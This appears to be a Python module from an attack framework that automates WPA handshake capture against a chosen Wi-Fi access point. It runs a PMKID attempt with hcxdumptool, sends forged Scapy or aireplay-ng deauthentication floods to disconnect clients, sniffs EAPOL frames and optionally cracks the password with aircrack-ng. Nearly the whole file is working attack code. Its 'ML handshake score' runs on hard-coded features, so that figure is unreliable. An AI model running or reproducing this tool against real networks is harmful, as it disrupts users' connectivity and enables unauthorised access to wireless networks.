class Exploit(Exploit):
    """Automated handshake capture with native Scapy EAPOL snooping."""

    __info__ = {
        "name": "Handshake Snooper",
        "description": (
            "Automated WPA handshake capture: deauth to force re-auth, EAPOL "
            "4-way capture via Scapy sniff() (native, default) or airodump-ng "
            "(optional), and verification via aircrack-ng. Compatible with "
            "aircrack-ng and hashcat. No cowpatty or pyrit required."
        ),
        "authors": ("André Henrique (@mrhenrike) | União Geek",),
        "references": (
            "https://github.com/FluxionNetwork/fluxion",
            "https://www.aircrack-ng.org/",
        ),
        "devices": ("wifi",),
    }

    target_bssid    = OptMAC("", "Target AP BSSID")
    target_channel  = OptString("", "Target AP channel")
    interface       = OptString("wlan0mon", "Monitor-mode interface")
    deauth_count    = OptInteger(5, "Deauth frames per burst")
    deauth_rounds   = OptInteger(3, "Number of deauth bursts")
    capture_timeout = OptInteger(60, "Max seconds to wait for handshake")
    output_dir      = OptString(".log", "Directory for captured handshakes")
    use_airodump    = OptBool(False, "Use airodump-ng as capturer instead of Scapy sniff()")
    native_deauth   = OptBool(True, "Use Scapy Dot11Deauth instead of aireplay-ng")
    pmkid_first     = OptBool(True, "Try PMKID clientless capture before deauth workflow")
    pmkid_timeout   = OptInteger(30, "Seconds reserved for PMKID-first attempt")
    auto_crack      = OptBool(False, "Auto-start cracking after capture (aircrack-ng)")
    wordlist        = OptString("", "Wordlist path for auto_crack")
    ml_score        = OptBool(True, "ML handshake quality scoring (if sklearn available)")
    dry_run         = OptBool(False, "Print workflow without executing")

    def _verify_handshake(self, cap_file: Path) -> bool:
        """Verify captured handshake is valid using aircrack-ng.

        Args:
            cap_file: Path to the capture file (.cap or .pcapng).

        Returns:
            True if aircrack-ng reports a valid WPA handshake.
        """
        if not shutil.which("aircrack-ng"):
            logger.warning("aircrack-ng not found; skipping handshake verification.")
            return False
        try:
            result = subprocess.run(
                ["aircrack-ng", str(cap_file)],
                capture_output=True, text=True, timeout=10,
                encoding="utf-8", errors="replace",
            )
            return "1 handshake" in result.stdout or "WPA" in result.stdout
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as exc:
            logger.debug("aircrack-ng verification error: %s", exc)
            return False

    def _try_pmkid_first(self, output: Path) -> Path | None:
        """Attempt PMKID-first capture before forcing deauth handshakes.

        Args:
            output: Directory to store the PMKID capture file.

        Returns:
            Path to the capture file if successful, None otherwise.
        """
        if not self.pmkid_first:
            return None
        if not shutil.which("hcxdumptool"):
            return None

        cap_file = output / "pmkid_first.pcapng"
        cmd = ["sudo", "hcxdumptool", "-i", self.interface, "-w", str(cap_file)]
        if self.target_channel:
            cmd.extend(["-c", self.target_channel])
        if self.target_bssid:
            filter_file = output / "pmkid_filter.txt"
            filter_file.write_text(self.target_bssid + "\n", encoding="utf-8")
            cmd.extend(["--filterlist_ap", str(filter_file), "--filtermode=2"])

        print_status(f"PMKID-first attempt ({self.pmkid_timeout}s)...")
        try:
            subprocess.run(cmd, timeout=int(self.pmkid_timeout), check=False)
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            return None

        if cap_file.exists() and cap_file.stat().st_size > 0:
            print_success(f"PMKID-first capture produced: {cap_file}")
            return cap_file
        return None

    def _send_deauth_native(self, count: int = 10) -> None:
        """Send deauth frames using Scapy (no external tools required).

        Sends broadcast deauth frames impersonating the target AP to
        force all clients to re-authenticate.

        Args:
            count: Number of deauth frames to send per call.
        """
        try:
            from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
        except ImportError:
            logger.warning("Scapy unavailable for native deauth; falling back to aireplay-ng.")
            self._send_deauth_aireplay(count)
            return

        pkt = (
            RadioTap()
            / Dot11(
                type=0, subtype=12,
                addr1="ff:ff:ff:ff:ff:ff",
                addr2=self.target_bssid,
                addr3=self.target_bssid,
            )
            / Dot11Deauth(reason=7)
        )
        sendp(pkt, iface=str(self.interface), count=count, inter=0.1, verbose=False)

    def _send_deauth_aireplay(self, count: int = 10) -> None:
        """Send deauth frames using aireplay-ng (aircrack-ng suite).

        Args:
            count: Number of deauth frames to send.
        """
        if not shutil.which("aireplay-ng"):
            print_error("aireplay-ng not found. Install aircrack-ng suite.")
            return
        try:
            subprocess.run(
                [
                    "sudo", "aireplay-ng", "--deauth", str(count),
                    "-a", self.target_bssid, str(self.interface),
                ],
                capture_output=True, timeout=15,
            )
        except subprocess.TimeoutExpired:
            pass

    def _capture_eapol_scapy(self, output_file: Path) -> bool:
        """Capture WPA 4-way handshake using Scapy EAPOL sniff.

        Listens on the monitor-mode interface for EAPOL frames
        (ether_type=0x888e), classifies each frame as M1/M2/M3/M4
        per (bssid, client) pair, and writes a .pcapng compatible
        with aircrack-ng and hashcat via wrpcap().

        Stops early if a complete 4-way handshake is detected. Falls
        back to writing all captured EAPOL frames if no complete
        handshake is found within the timeout.

        Args:
            output_file: Destination path for the capture file.

        Returns:
            True if a complete 4-way handshake was written.
        """
        try:
            from scapy.all import EAPOL, Dot11, sniff, wrpcap
        except ImportError:
            print_error("Scapy not installed. Install with: pip install scapy")
            return False

        target_bssid_lower = str(self.target_bssid).lower() if self.target_bssid else ""
        captured_packets: list = []
        handshake_state: dict[tuple[str, str], dict[str, bool]] = defaultdict(
            lambda: {"M1": False, "M2": False, "M3": False, "M4": False}
        )
        found_event = threading.Event()

        def _process_pkt(pkt) -> None:
            if not pkt.haslayer(EAPOL):
                return

            if target_bssid_lower and pkt.haslayer(Dot11):
                bssid_in_frame = (pkt[Dot11].addr3 or "").lower()
                if bssid_in_frame and bssid_in_frame != target_bssid_lower:
                    return

            captured_packets.append(pkt)

            try:
                eapol_raw = bytes(pkt[EAPOL])
                msg = _classify_eapol_message(eapol_raw)
            except Exception:
                msg = None

            if msg and pkt.haslayer(Dot11):
                dot11  = pkt[Dot11]
                src    = (dot11.addr2 or "").lower()
                bssid  = (dot11.addr3 or "").lower()
                dst    = (dot11.addr1 or "").lower()
                client = dst if src == target_bssid_lower else src
                key = (bssid, client)
                handshake_state[key][msg] = True
                logger.debug("EAPOL %s bssid=%s client=%s", msg, bssid, client)

                if all(handshake_state[key][m] for m in ("M1", "M2", "M3", "M4")):
                    print_success(
                        f"Complete 4-way handshake: bssid={bssid} client={client}"
                    )
                    found_event.set()

        print_status(f"Scapy EAPOL sniff on {self.interface} (timeout: {self.capture_timeout}s)...")
        try:
            sniff(
                iface=str(self.interface),
                lfilter=lambda p: p.haslayer(EAPOL),
                prn=_process_pkt,
                timeout=int(self.capture_timeout),
                stop_filter=lambda _: found_event.is_set(),
                store=False,
            )
        except Exception as exc:
            logger.error("Scapy sniff error: %s", exc)
            return False

        if not captured_packets:
            return False

        wrpcap(str(output_file), captured_packets)
        logger.info("Wrote %d EAPOL packet(s) to %s", len(captured_packets), output_file)

        if found_event.is_set():
            return True
        return len(captured_packets) >= 4

    def _capture_eapol_airodump(self, cap_prefix: Path) -> Path | None:
        """Capture handshake using airodump-ng subprocess.

        Launches airodump-ng in the background, sends deauth bursts, and
        polls for a valid handshake via aircrack-ng until the timeout.

        Args:
            cap_prefix: Prefix path for airodump-ng output files.

        Returns:
            Path to the .cap file if a valid handshake was captured, None otherwise.
        """
        if not shutil.which("airodump-ng"):
            print_error("airodump-ng not found. Install aircrack-ng suite.")
            return None

        airodump_cmd = [
            "sudo", "airodump-ng",
            "--bssid", self.target_bssid,
            "-w", str(cap_prefix),
            "--output-format", "pcap",
            str(self.interface),
        ]
        if self.target_channel:
            airodump_cmd.extend(["-c", self.target_channel])

        proc = subprocess.Popen(
            airodump_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        print_info("airodump-ng capturing... waiting 3s before deauth.")
        time.sleep(3)

        for round_num in range(int(self.deauth_rounds)):
            print_status(f"Deauth burst {round_num + 1}/{self.deauth_rounds}...")
            if bool(self.native_deauth):
                self._send_deauth_native(int(self.deauth_count))
            else:
                self._send_deauth_aireplay(int(self.deauth_count))
            time.sleep(5)

        print_info(f"Waiting for handshake (max {self.capture_timeout}s)...")
        start = time.time()
        cap_file: Path | None = None

        while time.time() - start < int(self.capture_timeout):
            caps = list(cap_prefix.parent.glob(cap_prefix.name + "*-01.cap"))
            for cf in caps:
                if self._verify_handshake(cf):
                    cap_file = cf
                    print_success(f"Valid handshake captured: {cf}")
                    break
            if cap_file:
                break
            time.sleep(5)

        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()

        return cap_file

    def check(self) -> str:
        """Verify wireless interface is in monitor mode and ready."""
        iface = getattr(self, "iface", None) or getattr(self, "interface", None) or "wlan0"
        if shutil.which("iwconfig"):
            try:
                out = subprocess.check_output(
                    ["iwconfig", str(iface)], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if "Monitor" in out:
                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
                if "no wireless extensions" not in out.lower():
                    return (
                        f"Interface {iface} found but NOT in Monitor mode"
                        f" - run airmon-ng start {iface}"
                    )
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                pass
        if shutil.which("iw"):
            try:
                out = subprocess.check_output(
                    ["iw", "dev"], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if str(iface) in out:
                    return f"Interface {iface} detected via iw - verify monitor mode"
            except Exception:
                pass
        return (
            f"Interface {iface} not found"
            " - connect wireless adapter and enable monitor mode"
        )

    def run(self) -> None:
        """Execute handshake snooper workflow."""
        if not self.target_bssid:
            print_error("target_bssid is required.")
            return

        require_authorised_lab()

        output = Path(str(self.output_dir))
        output.mkdir(parents=True, exist_ok=True)
        bssid_clean = str(self.target_bssid).replace(":", "")
        cap_prefix  = output / f"handshake_{bssid_clean}"

        if bool(self.dry_run):
            capture_method = (
                "airodump-ng" if bool(self.use_airodump) else "Scapy sniff() [EAPOL filter]"
            )
            deauth_method = (
                "aireplay-ng --deauth"
                if not bool(self.native_deauth)
                else "Scapy Dot11Deauth"
            )
            print_info("DRY RUN - Handshake Snooper workflow:")
            print_info(f"  Capture : {capture_method}")
            print_info(f"  Deauth  : {deauth_method} x {self.deauth_rounds} burst(s) of {self.deauth_count} frame(s)")
            print_info("  Verify  : aircrack-ng")
            if bool(self.use_airodump):
                print_info(f"  Command : airodump-ng --bssid {self.target_bssid} -c {self.target_channel} -w {cap_prefix} {self.interface}")
            return

        if not shutil.which("aircrack-ng"):
            print_error("aircrack-ng not found. Install aircrack-ng suite.")
            return

        if bool(self.use_airodump) and not shutil.which("airodump-ng"):
            print_error(
                "airodump-ng not found. Install aircrack-ng suite"
                " or set use_airodump=False."
            )
            return

        _pmkid = self._try_pmkid_first(output)
        if _pmkid:
            print_info("PMKID capture available; proceeding to handshake workflow.")

        print_status(f"Starting handshake capture for {self.target_bssid}...")

        cap_file: Path | None = None

        if bool(self.use_airodump):
            cap_file = self._capture_eapol_airodump(cap_prefix)
        else:
            scapy_cap_file = output / f"handshake_{bssid_clean}.pcapng"
            capture_result: dict[str, object] = {"success": False, "done": False}

            def _worker() -> None:
                capture_result["success"] = self._capture_eapol_scapy(scapy_cap_file)
                capture_result["done"] = True

            capture_thread = threading.Thread(target=_worker, daemon=True)
            capture_thread.start()

            time.sleep(2)
            for round_num in range(int(self.deauth_rounds)):
                if capture_result.get("done"):
                    break
                print_status(f"Deauth burst {round_num + 1}/{self.deauth_rounds}...")
                if bool(self.native_deauth):
                    self._send_deauth_native(int(self.deauth_count))
                else:
                    self._send_deauth_aireplay(int(self.deauth_count))
                time.sleep(5)

            capture_thread.join(timeout=int(self.capture_timeout))

            if scapy_cap_file.exists() and scapy_cap_file.stat().st_size > 0:
                cap_file = scapy_cap_file

        if cap_file is None or not cap_file.exists():
            print_error("Handshake not captured within timeout.")
            return

        if self._verify_handshake(cap_file):
            print_success(f"Valid handshake verified: {cap_file}")
        else:
            print_info(
                f"Capture written but verification incomplete: {cap_file}"
            )

        if bool(self.ml_score) and _HAS_ML:
            try:
                scorer = HandshakeScorer()
                features = {
                    "eapol_count": 4,
                    "has_m1": True, "has_m2": True, "has_m3": True, "has_m4": True,
                    "replay_consistent": True,
                    "nonces_unique": True,
                    "capture_duration_s": float(self.capture_timeout),
                }
                score = scorer.score(features)
                print_info(
                    f"ML Handshake Score: quality={score.quality}/100  completeness={score.completeness}  crack_prob={score.crack_probability:.0%}"
                )
                if score.quality < 50:
                    print_info("Low quality - consider re-capturing.")
            except Exception as exc:
                logger.debug("ML scoring failed: %s", exc)

        if bool(self.auto_crack) and self.wordlist:
            print_status(f"Auto-cracking with {self.wordlist}...")
            subprocess.run(
                [
                    "aircrack-ng", "-w", str(self.wordlist),
                    "-b", self.target_bssid, str(cap_file),
                ],
                check=False,
            )
